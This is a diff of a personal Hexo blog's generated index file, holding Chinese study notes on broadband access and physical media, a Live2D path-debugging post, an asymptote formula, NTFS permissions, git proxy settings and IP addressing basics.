-<li><p>在电缆头端，<u>电缆调制解调器端接系统（Cable Modem Termination System，CMTS）</u>与DSL网络的DSLAM具有类似的功能，即将来自许多下行家庭中的电缆调制解调器发送的模拟信号转换回数字形式</p>
-<p><img src="/2022/01/11/read-1.2/2.png" alt></p>
-</li>
-<li><p>如同DSL，上行信道分配的传输速率通常比下行信道的稿</p>
-</li>
-<li><p>电缆因特网接入的一个重要特征是共享广播媒体</p>
-</li>
-</ul>
-</li>
-<li><p>提供更高速率的新兴技术是<strong>光纤到户（Fiber To The Home，FTTH）</strong></p>
-<ul>
-<li><p>顾名思义，FTTH就是从本地中心局直接到家庭提供了一条光纤路径</p>
-</li>
-<li><p>从中心局出来的每根光纤实际上由许多家庭共享，直到相对接近这些家庭的位置，改光纤才分成每户一根光纤。进行这种分配由两种光纤分布体系结构：<u>有源光纤网络（Active Optical Network，AON）</u>和<u>无源光纤网络（Passive Optical Network，PON）</u></p>
-<ol>
-<li><p>AON：AON本质上就是交换以太网</p>
-</li>
-<li><p>PON：每个家庭具有一个<u>光纤网络端接器（Optical Network Terminator，ONT）</u>，它由专门的光纤连接到邻近的<u>分配器（splitter）</u>。分配器把一些家庭集结到一根共享的光纤，该光纤再连接到本地电话和公司的中心局中的<u>光纤线路端接器（Optical Line Terminator，OLT）</u>。OLT提供了光信号和电信号的转换，经过本地电话公司路由器与因特网相连。在家庭中，用户将一台家庭路由器与ONT相连，并经过这台家庭路由器接入因特网：</p>
-<p><img src="/2022/01/11/read-1.2/3.png" alt></p>
-</li>
-</ol>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="2、企业（和家庭）接入：以太网和WiFi"><a href="#2、企业（和家庭）接入：以太网和WiFi" class="headerlink" title="2、企业（和家庭）接入：以太网和WiFi"></a>2、企业（和家庭）接入：以太网和WiFi</h3><ul>
-<li><p>在越来越多的环境里，使用<u>局域网（LAN）</u>将端系统连接到边缘路由器</p>
-</li>
-<li><p>到目前为止，以太网是公司、大学和家庭网络中最为流行的接入技术</p>
-<p><img src="/2022/01/11/read-1.2/4.png" alt></p>
-</li>
-<li><p>在无线LAN环境中，无线用户从一个接入点 发送 / 接收 分组，该接入点与企业网相连，企业网再与有线因特网相连。基于IEEE 802.11技术的无线LAN接入，更通俗地称为WiFi，目前几乎无所不在</p>
-</li>
-<li><p>今天许多家庭将宽带住宅接入（即电缆调制解调器或DSL）与廉价的无线局域网技术结合起来，以产生强大的家用网络</p>
-<p><img src="/2022/01/11/read-1.2/5.png" alt></p>
-</li>
-</ul>
-<h3 id="3、广域无线接入：3G和LTE"><a href="#3、广域无线接入：3G和LTE" class="headerlink" title="3、广域无线接入：3G和LTE"></a>3、广域无线接入：3G和LTE</h3><ul>
-<li>iPhone和安卓等设备应用了与蜂窝移动电话相同的无线基础设施，通过蜂窝网提供商运营的基站来发送和接收分组</li>
-<li>电信公司已经在第三代无线技术（3G）中进行了大量投资，3G为分组交换广域无线因特网接入提供了超过1Mbps的速率</li>
-<li>而如今第四代（4G）已经全面覆盖，第五代（5G）也开始了部署</li>
-</ul>
-<h2 id="二、物理媒体"><a href="#二、物理媒体" class="headerlink" title="二、物理媒体"></a>二、物理媒体</h2><p>考虑一个比特从一个端系统开始传输，通过一系列链路和路由器，到达另一个端系统。这个比特当从源到目的地传输时，通过一系列 “发射器 - 接收器” 对，对于每个发射器 - 接收器对，通过跨越一种<strong>物理媒体（physical medium）</strong>传播电磁波或光脉冲来发送该比特。</p>
-<ul>
-<li>物理媒体分成两种类型：<strong>导引型媒体（guided media）</strong>和<strong>非导引型媒体（unguided media）</strong><ol>
-<li>导引型媒体，电波沿着固体媒体前行，如光缆、双绞铜线或同轴电缆</li>
-<li>非导引型媒体，电波在空气或外层空间中传播，例如在无线局域网或数字卫星频道中</li>
-</ol>
-</li>
-</ul>
-<h3 id="1、双绞铜线"><a href="#1、双绞铜线" class="headerlink" title="1、双绞铜线"></a>1、双绞铜线</h3><ul>
-<li>最便宜并且最为常用的导引型传输媒体</li>
-<li>双绞线由两根绝缘的铜线组成，以规则的螺旋状排列着</li>
-<li><strong>无屏蔽双绞线（Unshielded Twisted Pair，UTP）</strong>常用在建筑物内的计算机网络中，即用于局域网（LAN）中</li>
-<li>目前局域网中的双绞线的数据传输速率从10Mbps导10Gbps，所能达到的数据传输速率取决于线的粗细以及传输方和接收方之间的距离</li>
-</ul>
-<h3 id="2、同轴电缆"><a href="#2、同轴电缆" class="headerlink" title="2、同轴电缆"></a>2、同轴电缆</h3><ul>
-<li>与双绞线类似，由两个铜导体组成但是这两个导体是同心的而不是并行的，借助这种结构及特殊的绝缘体和保护层，同轴电缆能够达到较高的数据传输速率</li>
-<li>同轴电缆能被用作导引型<strong>共享媒体（shared medium）</strong>，特别是，许多端系统能够直接与该电缆相连，每个端系统都能接收由其他端系统发送的内容</li>
-</ul>
-<h3 id="3、光纤"><a href="#3、光纤" class="headerlink" title="3、光纤"></a>3、光纤</h3><ul>
-<li>光纤是一种细而柔软的、能够导引光脉冲的媒体，每个脉冲表示一个比特</li>
-<li>一根光纤能够支持极高的比特速率，高达数十甚至数百Gbps</li>
-<li>它们不受电磁干扰，信号衰减极低，成为长途导引型传输媒体，特别是跨海链路</li>
-</ul>
-<h3 id="4、陆地无线电信道"><a href="#4、陆地无线电信道" class="headerlink" title="4、陆地无线电信道"></a>4、陆地无线电信道</h3><ul>
-<li>无线电信道承载电磁频谱中的信号</li>
-<li>它能穿透墙壁，因此极大依赖传播环境和信号传输的距离：<ol>
-<li>路径损耗和遮挡衰落（信号跨距离传播和穿过阻碍物体时信号强度降低）</li>
-<li>多径衰落（干扰对象的信号反射）</li>
-<li>干扰（其他传输或电磁信号）</li>
-</ol>
-</li>
-<li>陆地无线电信道大致分为三类：一类运行在很短距离（如1m或2m）；另一类运行在局域，通常跨越数十到几百米；第三类运行在广域，跨越数万米</li>
-</ul>
-<h3 id="5、卫星无线电信道"><a href="#5、卫星无线电信道" class="headerlink" title="5、卫星无线电信道"></a>5、卫星无线电信道</h3><p>一颗通信卫星连接地球上的两个或多个微波发射器/接收器，它们被称为地面站。该卫星在一个频段上接收传输，使用一个转发器再生信号，并在另一个频率上发射信号。通信中尝试用两类卫星：<strong>同步卫星（geostationary satellite）</strong>和<strong>近地轨道（Low-Earth Orbiting，LEO）</strong>卫星。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> read </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Failed to load resource</title>
+      <link href="/2022/01/10/study-3/"/>
+      <url>/2022/01/10/study-3/</url>
+      
+        <content type="html"><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p><p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p><p>bug们想尽各种办法出现，只为了锻炼我们的能力</p><p><img src="/2022/01/10/study-3/3.jpg" alt></p><p>比如：</p><p><img src="/2022/01/10/study-3/1.png" alt></p><p><img src="/2022/01/10/study-3/2.png" alt></p><p>在我这里他们是同一种错误，只是不同的浏览器而已</p><span id="more"></span><hr><p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p><p>看着这些404 not found 我觉得很大可能是路径问题</p><p>加上很多文章也说路径问题</p><p>于是进行了修改：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>更改后：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p><p>于是我改成绝对路径：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p><p>请求网址变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure><p>你说这是什么道理（无奈）</p><hr><p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p><p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p><hr><p>参考：</p><p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p><p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>]]></content>
+      
+      
       <categories>
-        <category>读书笔记</category>
+          
+          <category> 基础知识和笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>read</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git clone出错</title>
-    <url>/2022/01/09/study-1/</url>
-    <content><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure>
-<h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> learn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>求斜渐近线</title>
+      <link href="/2022/01/10/math/"/>
+      <url>/2022/01/10/math/</url>
+      
+        <content type="html"><![CDATA[<script type="math/tex; mode=display">如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr><script type="math/tex; mode=display">求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
+      
+      
       <categories>
-        <category>基础知识和笔记</category>
+          
+          <category> 高数笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NTFS权限</title>
-    <url>/2022/01/09/study-2/</url>
-    <content><![CDATA[<h1 id="0x01-NTFS权限概述"><a href="#0x01-NTFS权限概述" class="headerlink" title="0x01 NTFS权限概述"></a>0x01 NTFS权限概述</h1><ol>
-<li>通过设置NTFS权限，实现不同的用户访问不同的权限</li>
-<li>分配了正确的访问权限后，用户才能访问其资源</li>
-<li>设置权限防止资源被篡改、删除</li>
-</ol>
-<h1 id="0x02-文件系统概述"><a href="#0x02-文件系统概述" class="headerlink" title="0x02 文件系统概述"></a>0x02 文件系统概述</h1><p>文件系统即在外部存储设备上组织文件的方法</p>
-<p>常见的文件系统:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FAT     Windows</span><br><span class="line">NTFS    Windows</span><br><span class="line">EXT     Linux常见</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="0x03-NTFS文件系统特点"><a href="#0x03-NTFS文件系统特点" class="headerlink" title="0x03 NTFS文件系统特点"></a>0x03 NTFS文件系统特点</h1><ol>
-<li>提高磁盘读写性能</li>
-<li>可靠性<ul>
-<li>加密文件系统</li>
-<li>访问控制列表（ACL）（设置权限）</li>
-</ul>
-</li>
-<li>磁盘利用率<ul>
-<li>压缩</li>
-<li>磁盘配额（管理服务器）</li>
-</ul>
-</li>
-<li>支持单个文件大于4GB</li>
-</ol>
-<h1 id="0x04-修改NTFS权限"><a href="#0x04-修改NTFS权限" class="headerlink" title="0x04 修改NTFS权限"></a>0x04 修改NTFS权限</h1><h3 id="4-1-修改权限继承"><a href="#4-1-修改权限继承" class="headerlink" title="4.1 修改权限继承"></a>4.1 修改权限继承</h3><ul>
-<li>作用：取消后，可以任意修改权限列表</li>
-<li>方法：文件夹右键属性—-安全—-高级—-去掉第一个对号—-选择复制即可</li>
-</ul>
-<h3 id="4-2-文件及文件权限"><a href="#4-2-文件及文件权限" class="headerlink" title="4.2 文件及文件权限"></a>4.2 文件及文件权限</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th><strong>文件权限</strong></th>
-<th><strong>权限内容</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>完全控制</td>
-<td>拥有读取、写入、修改、删除文件、特殊的权限</td>
-</tr>
-<tr>
-<td>修改</td>
-<td>拥有读取、写入、修改、删除文件的权限</td>
-</tr>
-<tr>
-<td>读取和执行</td>
-<td>拥有读取、执行文件的权限</td>
-</tr>
-<tr>
-<td>读取</td>
-<td>拥有读取文件的权限</td>
-</tr>
-<tr>
-<td>写入</td>
-<td>拥有修改文件内容的权限</td>
-</tr>
-<tr>
-<td>特殊权限</td>
-<td>控制文件权限列表的权限</td>
-</tr>
-</tbody>
-</table>
-</div>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th><strong>文件夹权限</strong></th>
-<th><strong>权限内容</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>完全控制</td>
-<td>拥有对文件及文件夹读取、写入、修改、删除文件、特殊的权限</td>
-</tr>
-<tr>
-<td>修改</td>
-<td>拥有对文件及文件夹读取、写入、修改、删除文件的权限</td>
-</tr>
-<tr>
-<td>读取和执行</td>
-<td>拥有对文件夹中的文件下载、读取、执行的权限</td>
-</tr>
-<tr>
-<td>列出文件夹内容</td>
-<td>可以列出文件夹的内容</td>
-</tr>
-<tr>
-<td>读取</td>
-<td>拥有对文件夹中的文件下载、读取的权限</td>
-</tr>
-<tr>
-<td>写入</td>
-<td>拥有在文件夹中创建新的文件的权限</td>
-</tr>
-<tr>
-<td>特殊权限</td>
-<td>控制文件夹权限列表的权限</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h3 id="4-3-权限累加"><a href="#4-3-权限累加" class="headerlink" title="4.3 权限累加"></a>4.3 权限累加</h3><p>当用户同时属于多个组时，权限是累加的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">用户A同时属于a组和b组，a组对文件夹123可以读取，b组可以对文件夹123可以写入，则A用户最终的权限为读取和写入</span><br></pre></td></tr></table></figure>
-<h3 id="4-4-拒绝最大"><a href="#4-4-拒绝最大" class="headerlink" title="4.4 拒绝最大"></a>4.4 拒绝最大</h3><p>当用户权限累加时，如遇到拒绝权限，拒绝最大！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">用户A属于财务部组，财务部组成员为10个用户，财务部组拥有对文件夹123的访问权限，现要求A用户不能脱离财务部组，同时要求A用户没有访问文件夹123的权限</span><br></pre></td></tr></table></figure>
-<h3 id="4-5-取得所有权"><a href="#4-5-取得所有权" class="headerlink" title="4.5 取得所有权"></a>4.5 取得所有权</h3><p>默认只有administrator有这个权限</p>
-<p>作用：可以将任何文件夹的所有者改为administrator</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">用户A已离职，但文件夹123的主人是A，由于A用户对该文件夹做过权限修改，导致其他用户对该文件夹没有任何权限，现需要管理员administrator用户将该文件夹重新修改权限</span><br></pre></td></tr></table></figure>
-<h3 id="4-6-强制继承"><a href="#4-6-强制继承" class="headerlink" title="4.6 强制继承"></a>4.6 强制继承</h3><p>作用：对下强制继承父子关系</p>
-<p>方法：文件夹右键属性—安全—高级—勾上第二个对号即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">123文件夹下有许多个子文件夹及文件，由于长时间的权限管理，多个子文件夹的权限都做过不同的权限修改，现需要该文件夹下的所有子文件夹及子文件的权限全部统一</span><br></pre></td></tr></table></figure>
-<h3 id="4-7-文件复制对权限的影响"><a href="#4-7-文件复制对权限的影响" class="headerlink" title="4.7 文件复制对权限的影响"></a>4.7 文件复制对权限的影响</h3><p>文件复制后，文件的权限被目标文件夹的权限覆盖</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> math </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>NTFS权限</title>
+      <link href="/2022/01/09/study-2/"/>
+      <url>/2022/01/09/study-2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-NTFS权限概述"><a href="#0x01-NTFS权限概述" class="headerlink" title="0x01 NTFS权限概述"></a>0x01 NTFS权限概述</h1><ol><li>通过设置NTFS权限，实现不同的用户访问不同的权限</li><li>分配了正确的访问权限后，用户才能访问其资源</li><li>设置权限防止资源被篡改、删除</li></ol><h1 id="0x02-文件系统概述"><a href="#0x02-文件系统概述" class="headerlink" title="0x02 文件系统概述"></a>0x02 文件系统概述</h1><p>文件系统即在外部存储设备上组织文件的方法</p><p>常见的文件系统:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FAT     Windows</span><br><span class="line">NTFS    Windows</span><br><span class="line">EXT     Linux常见</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="0x03-NTFS文件系统特点"><a href="#0x03-NTFS文件系统特点" class="headerlink" title="0x03 NTFS文件系统特点"></a>0x03 NTFS文件系统特点</h1><ol><li>提高磁盘读写性能</li><li>可靠性<ul><li>加密文件系统</li><li>访问控制列表（ACL）（设置权限）</li></ul></li><li>磁盘利用率<ul><li>压缩</li><li>磁盘配额（管理服务器）</li></ul></li><li>支持单个文件大于4GB</li></ol><h1 id="0x04-修改NTFS权限"><a href="#0x04-修改NTFS权限" class="headerlink" title="0x04 修改NTFS权限"></a>0x04 修改NTFS权限</h1><h3 id="4-1-修改权限继承"><a href="#4-1-修改权限继承" class="headerlink" title="4.1 修改权限继承"></a>4.1 修改权限继承</h3><ul><li>作用：取消后，可以任意修改权限列表</li><li>方法：文件夹右键属性—-安全—-高级—-去掉第一个对号—-选择复制即可</li></ul><h3 id="4-2-文件及文件权限"><a href="#4-2-文件及文件权限" class="headerlink" title="4.2 文件及文件权限"></a>4.2 文件及文件权限</h3><div class="table-container"><table><thead><tr><th><strong>文件权限</strong></th><th><strong>权限内容</strong></th></tr></thead><tbody><tr><td>完全控制</td><td>拥有读取、写入、修改、删除文件、特殊的权限</td></tr><tr><td>修改</td><td>拥有读取、写入、修改、删除文件的权限</td></tr><tr><td>读取和执行</td><td>拥有读取、执行文件的权限</td></tr><tr><td>读取</td><td>拥有读取文件的权限</td></tr><tr><td>写入</td><td>拥有修改文件内容的权限</td></tr><tr><td>特殊权限</td><td>控制文件权限列表的权限</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><strong>文件夹权限</strong></th><th><strong>权限内容</strong></th></tr></thead><tbody><tr><td>完全控制</td><td>拥有对文件及文件夹读取、写入、修改、删除文件、特殊的权限</td></tr><tr><td>修改</td><td>拥有对文件及文件夹读取、写入、修改、删除文件的权限</td></tr><tr><td>读取和执行</td><td>拥有对文件夹中的文件下载、读取、执行的权限</td></tr><tr><td>列出文件夹内容</td><td>可以列出文件夹的内容</td></tr><tr><td>读取</td><td>拥有对文件夹中的文件下载、读取的权限</td></tr><tr><td>写入</td><td>拥有在文件夹中创建新的文件的权限</td></tr><tr><td>特殊权限</td><td>控制文件夹权限列表的权限</td></tr></tbody></table></div><h3 id="4-3-权限累加"><a href="#4-3-权限累加" class="headerlink" title="4.3 权限累加"></a>4.3 权限累加</h3><p>当用户同时属于多个组时，权限是累加的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">用户A同时属于a组和b组，a组对文件夹123可以读取，b组可以对文件夹123可以写入，则A用户最终的权限为读取和写入</span><br></pre></td></tr></table></figure><h3 id="4-4-拒绝最大"><a href="#4-4-拒绝最大" class="headerlink" title="4.4 拒绝最大"></a>4.4 拒绝最大</h3><p>当用户权限累加时，如遇到拒绝权限，拒绝最大！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">用户A属于财务部组，财务部组成员为10个用户，财务部组拥有对文件夹123的访问权限，现要求A用户不能脱离财务部组，同时要求A用户没有访问文件夹123的权限</span><br></pre></td></tr></table></figure><h3 id="4-5-取得所有权"><a href="#4-5-取得所有权" class="headerlink" title="4.5 取得所有权"></a>4.5 取得所有权</h3><p>默认只有administrator有这个权限</p><p>作用：可以将任何文件夹的所有者改为administrator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">用户A已离职，但文件夹123的主人是A，由于A用户对该文件夹做过权限修改，导致其他用户对该文件夹没有任何权限，现需要管理员administrator用户将该文件夹重新修改权限</span><br></pre></td></tr></table></figure><h3 id="4-6-强制继承"><a href="#4-6-强制继承" class="headerlink" title="4.6 强制继承"></a>4.6 强制继承</h3><p>作用：对下强制继承父子关系</p><p>方法：文件夹右键属性—安全—高级—勾上第二个对号即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">123文件夹下有许多个子文件夹及文件，由于长时间的权限管理，多个子文件夹的权限都做过不同的权限修改，现需要该文件夹下的所有子文件夹及子文件的权限全部统一</span><br></pre></td></tr></table></figure><h3 id="4-7-文件复制对权限的影响"><a href="#4-7-文件复制对权限的影响" class="headerlink" title="4.7 文件复制对权限的影响"></a>4.7 文件复制对权限的影响</h3><p>文件复制后，文件的权限被目标文件夹的权限覆盖</p>]]></content>
+      
+      
       <categories>
-        <category>基础知识和笔记</category>
+          
+          <category> 基础知识和笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Failed to load resource</title>
-    <url>/2022/01/10/study-3/</url>
-    <content><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p>
-<p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p>
-<p>bug们想尽各种办法出现，只为了锻炼我们的能力</p>
-<p><img src="/2022/01/10/study-3/3.jpg" alt></p>
-<p>比如：</p>
-<p><img src="/2022/01/10/study-3/1.png" alt></p>
-<p><img src="/2022/01/10/study-3/2.png" alt></p>
-<p>在我这里他们是同一种错误，只是不同的浏览器而已</p>
-<span id="more"></span>
-<hr>
-<p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p>
-<p>看着这些404 not found 我觉得很大可能是路径问题</p>
-<p>加上很多文章也说路径问题</p>
-<p>于是进行了修改：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>更改后：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p>
-<p>于是我改成绝对路径：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p>
-<p>请求网址变成了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>你说这是什么道理（无奈）</p>
-<hr>
-<p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p>
-<p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p>
-<hr>
-<p>参考：</p>
-<p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p>
-<p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> learn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>git clone出错</title>
+      <link href="/2022/01/09/study-1/"/>
+      <url>/2022/01/09/study-1/</url>
+      
+        <content type="html"><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure><h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>基础知识和笔记</category>
+          
+          <category> 基础知识和笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IP地址详解</title>
-    <url>/2022/01/09/study/</url>
-    <content><![CDATA[<h1 id="0x01-IP（IPv4）"><a href="#0x01-IP（IPv4）" class="headerlink" title="0x01 IP（IPv4）"></a>0x01 IP（IPv4）</h1><p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></table></figure>
-<h1 id="0x02-子网掩码"><a href="#0x02-子网掩码" class="headerlink" title="0x02 子网掩码"></a>0x02 子网掩码</h1><ol>
-<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
-<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
-<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
-</ol>
-<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
-<span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br></pre></td></tr></table></figure>
